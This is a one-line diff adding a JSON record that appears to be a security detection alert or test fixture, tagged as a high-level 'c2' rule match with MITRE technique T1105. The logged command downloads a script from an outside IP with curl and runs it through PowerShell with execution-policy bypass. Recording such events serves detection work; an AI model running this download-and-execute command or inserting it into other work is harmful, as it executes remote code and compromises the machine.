@@ -1,0 +1,1 @@
+{"timestamp": "2026-10-16T23:57:46+00:00", "rule": "c2", "level": "high", "computer": "PC", "command": "curl -s http://198.51.100.7/setup.sh -o agent.ps1 & powershell -ep bypass -f agent.ps1", "techniques": ["T1105"]}
